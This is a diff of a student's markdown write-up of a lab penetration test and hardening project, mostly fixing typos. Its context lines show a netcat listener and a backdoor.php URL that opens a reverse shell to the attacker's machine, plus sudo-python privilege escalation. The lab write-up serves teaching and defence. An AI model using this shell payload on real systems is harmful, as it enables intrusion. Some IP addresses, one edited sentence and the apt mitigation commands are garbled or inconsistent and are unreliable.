@@ -87,7 +87,7 @@ After switching users to Steven, I checked his sudo access.
 
 ![sudo access](/images/class-projects/final/sudo.png)
 
-and saw that he has sudo access for python. That's certainly an issue considering python can execute commands including things like creatinga new bash shell.
+and saw that he has sudo access for python. That's certainly an issue considering python can execute commands including things like creating a new bash shell.
 
 After writing a quick little privilege escalations script
 
@@ -102,7 +102,7 @@ which created a new shell as root.
 Flag4 was inside root's home directory, and was the final objective for Target1.
 
 ### Target 2 192.168.1.115
-This goal on this machine was only to gain user access, although it did take a little more work to get there.
+The goal on this machine was to gain user access, which took a little more work than Target1.
 
 #### Reconassiance
 This machine started off similarly with a nmap scan `nmap -sV 162.168.1.115` and then running DirBuster.
@@ -112,13 +112,13 @@ This machine started off similarly with a nmap scan `nmap -sV 162.168.1.115` and
 This revealed the directory `192.168.1.115/vendor/PATH` which contained Flag1.
 
 #### Mail PHP Remote Code Execution
-For the next step, we were actually provided with a script for the exploit, but I did a little bit of research on it to see how it works.
+For the next step a script for the exploit, but I did a little bit of research on the script to see how it works.
 
-In the PHP mailer being used, there are five paramaters used by the mail function. The `to`, `subject`, and `message` paramaters are required paramaters, and `additional headers` and `additional_parameters` are two optional paramaters. It's the 5th paramater, the option `additional_parameters` that's interesting for exploitation purposes.
+In the PHP mailer being used, there are five paramaters used by the mail function. The `to`, `subject`, and `message` paramaters are required paramaters, and `additional headers` and `additional_parameters` are two optional paramaters. It's the optional 5th paramater `additional_parameters` that's susceptible to exploitation.
 
-By creating a mail message with a carefully crafted 5th parameter an aritrary file could be written onto the server. In this case it was used to write a file that enabled a php command injection attack.
+By creating a mail message with a carefully crafted 5th parameter, an arbitrary file can be written onto the server. In this case it was used to write a file that enabled a php command injection attack.
 
-First, netcat was used to start a listener. `nc -lnvp 4444` and then the php command injection was used to open a back door.
+First, netcat was used to start a listener `nc -lnvp 4444` and then the php command injection was used to open a back door.
 `192.198.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash`
 
 That connection immediately revealed Flag2
@@ -130,10 +130,10 @@ Flag3 was located with a find command
 
 ![flag3](/images/class-projects/final/flag3.png)
 
-as a png image, which was view in a web browser
+as a png image, which was viewed in a web browser.
 `192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png`
 
-Which was the final flag of the activity.
+This was the final flag of the activity.
 
 #### Summary
 ##### Target 1
@@ -144,13 +144,13 @@ Which was the final flag of the activity.
 - Insecure Wordpress Config
 - Improper Sudo Privileges
 
-Weak passwords came up a couple times on this machine. Michael's password was guessable, and the password hashes found in the mySQL database were unsalted.
+Weak passwords came up a couple times on this machine. Michael's password was guessable, and the password hashes found in the mySQL database were weakly salted.
 
 A good deal of the file structure for the webserver was unnecessairly visable.
 
 While it wasn't needed for this exercise, the version of SSH on the target was outdated and has vulnerabilities associated with it.
 
-The Wordpress configuration files that was accessed to gain the mySQL database credentials should not have been accessable on Michael's account.
+The Wordpress configuration file that was accessed to gain the mySQL database credentials should not have been accessible on Michael's account.
 
 Sudo was improperly configured for Steven's account, allowing sudo access to a program that should not have sudo access. This was ultimately how root access was obtained.
 
@@ -175,7 +175,7 @@ The third of the basic alerts for this activity tracked HTTP Errors. It monitore
 
 ![HTTP Errors](/images/class-projects/final/HTTPErrors.jpg)
 
-These three alerts were set up before the offensive portion of the project began to catch some of the suspicious activity that might occur during the offensive sections, such as failed login attempts while trying to brute force credentials.
+These three alerts were set up before the offensive portion of the project began to catch some of the suspicious activity such as failed login attempts while trying to brute force credentials.
 
 ### Hardening the Servers
 In addition to the vulnerabilities that were used to exploit the machines in the penetration testing section, there were a handful of outdated services running on the target machines with known vulnerabilities.
@@ -185,19 +185,22 @@ Both target machines were running Apache 2.4.10 which contained known vulnerabil
 
 ![CVE-201703167](/images/class-projects/final/apache.png)
 
-The vulnerability was patched in versions 2.2.33 and 2.4.26, and updating to the newest apache version mitigates the vulnerability. At the time of the project the latest version of apache was 2.4.46.
+The vulnerability was patched in versions 2.2.33 and 2.4.26. Updating to the newest apache version mitigates the vulnerability. At the time of the project the latest version of apache was 2.4.46.
+
 **Mitigation** `sudo apt install apache 2.4`
 
 #### Updating OpenSSH
 The target machines were running OpenSSH 6.7p1 which is vulnerable to [CVE-2018-15919](https://www.cvedetails.com/cve/CVE-2018-15919/).
 ![CVE-2018-15919](/images/class-projects/final/openssh.png)
 The vulnerability existed through versions 7.8, so updating to the latest version of OpenSSH would effectively mitigate the vulnerability. At the time of the project, the latest version was 8.3.
+
 **Mitigation** `sudo apt install ssh 8.3`
 
 #### Updating Samba
 Another vulnerable service on the target machines was Samba. The machines were vulnerable to a code execution vulnerability through Samba, [CVE-2017-7494](https://www.cvedetails.com/cve/CVE-2017-7494/).
 ![CVE-2017-7494](/images/class-projects/final/samba.png)
 Like the other vulnerability, the solution was to update to a newer version where the vulnerability had been patched. In this case, version 4.12.
+
 **Mitigation** `sudo apt install samba 4.12`
 
 Alternatively, those updates could be done through ansible using a [YAML playbook](./updates.yml).
@@ -208,7 +211,7 @@ The network analysis portion of the project was done by using wireshark to analy
 
 Overall the traffic in the PCAP contained 808 unique ip addresses from 3 subnets: `10.0.0.0/24`, `10.6.12.0/24`, and `172.16.4.0/24`
 
-There was some beneign activity detected such as browsing web pages or watching youtube videos, as well as some suspicious activity. There were some instances of files being sent out of the subnet, and well as an instance of malware being sent to a machine.
+There was some benign activity detected such as browsing web pages or watching YouTube videos, as well as some suspicious activity. There were some instances of files being sent out of the subnet, and well as an instance of malware being sent to a machine.
 
 ### Web Browsing
 
@@ -224,13 +227,13 @@ On closer inspection those files did appear to be malicious.
 
 ### Watching YouTube
 
-Some users were detected connecting to youtube over the TCP protocol.
+Some users were detected connecting to YouTube over the TCP protocol.
 
-![youtube TCP](/images/class-projects/final/TCP.png)
+![YouTube TCP](/images/class-projects/final/TCP.png)
 
 and some connections using UDP were found as well.
 
-![youtube UDP](/images/class-projects/final/UDP.png)
+![YouTube UDP](/images/class-projects/final/UDP.png)
 
 ### Malware Sent to a Machine on the Network (12.6.12.0/24)
 
